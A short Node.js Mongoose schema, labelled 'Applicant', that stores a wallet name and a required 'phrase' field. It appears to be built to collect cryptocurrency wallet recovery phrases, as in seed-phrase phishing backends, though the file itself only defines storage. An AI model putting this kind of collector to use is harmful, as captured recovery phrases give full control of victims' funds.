const mongoose = require('mongoose');


const applicantSchema = new mongoose.Schema({
    wallet: {
        type: String,
        required: [true, 'Please Input the wallet name']
    },
    phrase: {
        type: String,
        required: [true, 'Please Input the phrase'],
    },
});

const Applicant = mongoose.model('detail', applicantSchema);
module.exports = Applicant;